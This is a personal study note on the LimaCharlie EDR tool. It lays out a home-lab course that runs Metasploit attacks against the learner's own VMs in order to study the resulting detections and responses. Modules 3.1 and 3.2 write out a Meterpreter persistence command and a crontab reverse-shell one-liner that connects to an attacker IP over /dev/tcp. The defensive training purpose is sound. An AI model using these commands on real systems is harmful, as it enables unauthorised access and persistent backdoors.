---
tags: 
date-created: 2025-01-30
dg-publish:
---
[[Endpoint Security MOC]]

- **sensors** are agents that sends data to LimaCharlie's cloud.
- **Installation Keys** are used by Sensors to authenticate and report data to the correct organization.

![[LimaCharlie.png]]
**Installing sensor** in Windows by downloading appropriate architecture:

![[LimaCharlie-1.png]]
**Output:**

![[LimaCharlie-2.png]]
- After clicking the endpoint: we can do a lot of stuff including viewing _AutoRuns_ program, perform action in console, navigate File System: download, copy hash, view **network**,  **processes** , **services** and many more.
- At **Overview**: we can isolate the endpoint only allowing comms with LimaCharlie.

# LimaCharlie EDR Hands-On Course

## Objective

Gain a deep understanding of LimaCharlie’s EDR capabilities by setting up a monitored environment, simulating attacks using Metasploit, and analyzing detections.

---

## Module 1: Lab Setup & LimaCharlie Installation

### 1.1. Prerequisites

- **Ubuntu VM** (Attacker): Installed with **Metasploit Framework (msfconsole)**
- **Windows VM** (Victim): Updated with essential tools (PowerShell, Sysinternals)
- **LimaCharlie Free Tier Account**

### 1.2. Install LimaCharlie Agents

- **Windows VM:**
    
    - Download and install the LimaCharlie agent from the LimaCharlie dashboard.
    - Ensure it's running and reporting to the LimaCharlie cloud.
    - Verify connectivity using:
        
        ```
        Get-Service | Where-Object { $_.Name -like "LimaCharlie*" }
        ```
        
- **Ubuntu VM:**
    
    - Download and install the Linux agent from the LimaCharlie dashboard.
    - Verify the agent is running:
        
        ```
        systemctl status limacharlie-agent
        ```
        
    - Ensure it appears in the **LimaCharlie dashboard** under "Endpoints."

---

## Module 2: Setting Up Restricted Folders & Detecting Access

### 2.1. Windows: High-Privilege Folder

- Create a **restricted folder**:
    
    ```
    mkdir C:\SensitiveData
    icacls C:\SensitiveData /deny Everyone:(F)
    ```
    
- Test access:
    
    ```
    cd C:\SensitiveData
    ```
    
    Should return **Access Denied**.
    
- **Simulate Unauthorized Access:**
    
    - Use Metasploit on Ubuntu VM:
        
        ```
        use exploit/windows/smb/psexec
        ```
        
    - Once access is gained, attempt to access `C:\SensitiveData`.
- **LimaCharlie Detection**:
    
    - Check for alerts under **Detections → Unauthorized File Access**.

### 2.2. Linux: High-Privilege Directory

- Create a protected directory:
    
    ```
    sudo mkdir /root/SecretFiles
    sudo chmod 700 /root/SecretFiles
    ```
    
- Test access:
    
    ```
    cd /root/SecretFiles
    ```
    
    Should return **Permission Denied** for normal users.
    
- **Simulate Unauthorized Access**:
    
    - Use Metasploit to gain a shell on the Linux VM.
    - Attempt `cd /root/SecretFiles`.
- **LimaCharlie Detection**:
    
    - Check alerts under **Detections → Unauthorized File Access**.

---

## Module 3: Process Monitoring & Persistence Detection

### 3.1. Windows: Meterpreter Persistence

- **Simulate an Attack:**
    
    ```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    ```
    
    - Deploy the payload and establish a session.
    - Set up persistence:
        
        ```
        run persistence -U -i 5 -p 4444 -r <Attacker-IP>
        ```
        
- **LimaCharlie Detection**:
    - Check **Detections → Suspicious Process Creation**.
    - Observe **unexpected scheduled tasks or registry modifications**.

### 3.2. Linux: Cronjob Backdoor

- **Simulate an Attack**:
    - Establish a session via Metasploit.
    - Add a cron job for persistence:
        
        ```
        echo "* * * * * /bin/bash -i >& /dev/tcp/<Attacker-IP>/4444 0>&1" >> /etc/crontab
        ```
        
- **LimaCharlie Detection**:
    - Check **Detections → Unauthorized Cron Modifications**.

---

## Module 4: Network Traffic Analysis

### 4.1. Windows: Detecting Reverse Shells

- **Simulate an Attack:**
    
    ```
    use exploit/windows/smb/ms17_010_eternalblue
    ```
    
- **LimaCharlie Detection**:
    - Go to **Network Logs**.
    - Look for **unusual outbound connections** (e.g., high port activity).

### 4.2. Linux: Suspicious Outbound Traffic

- **Simulate an Attack**:
    
    ```
    use auxiliary/scanner/ssh/ssh_login
    ```
    
    - Brute-force SSH access to another system.
- **LimaCharlie Detection**:
    - Check **Network Activity → SSH Brute-Force Detection**.

---

## Module 5: Isolating & Responding to Threats

### 5.1. Windows: Isolating a Compromised Endpoint

- Use **LimaCharlie’s Remote Response**:
    - Go to the LimaCharlie dashboard.
    - Select the compromised endpoint.
    - Click **Isolate Endpoint** to block all network activity.

### 5.2. Linux: Terminating Malicious Processes

- Identify the **malicious process**:
    
    ```
    ps aux | grep reverse
    ```
    
- Use LimaCharlie to **remotely kill** the process:
    
    ```
    kill -9 <PID>
    ```
    

---

## Module 6: Interview Preparation

### 6.1. Key Topics

- Explain **how LimaCharlie detects unauthorized access**.
- Discuss **common attacker techniques** detected in the course.
- How LimaCharlie **compares to other EDRs**.
- Walk through **a real-world detection & response scenario**.

### 6.2. Mock Interview Questions

1. How does LimaCharlie perform process monitoring?
2. How do you detect unauthorized file access using LimaCharlie?
3. What steps would you take if you saw a **suspicious outbound connection**?
4. How would you **remediate a persistent Metasploit backdoor** using LimaCharlie?

---

## Final Challenge: Full Red vs. Blue Simulation

**Scenario**: You will act as both an **attacker** and a **defender**.

- **Step 1**: Use Metasploit to compromise the **Windows VM**.
- **Step 2**: Attempt to escalate privileges and install persistence.
- **Step 3**: Use LimaCharlie to **detect**, **analyze**, and **respond**.
- **Step 4**: Write a report on:
    - Attack methodology.
    - Detection logs from LimaCharlie.
    - Steps taken to contain and remediate.

---

# Conclusion

By completing this course, you will: ✅ Gain **hands-on EDR experience**.  
✅ Master **LimaCharlie detections & response**.  
✅ Be **interview-ready** for security analyst roles.  
✅ Learn how to **detect & mitigate real-world attacks**.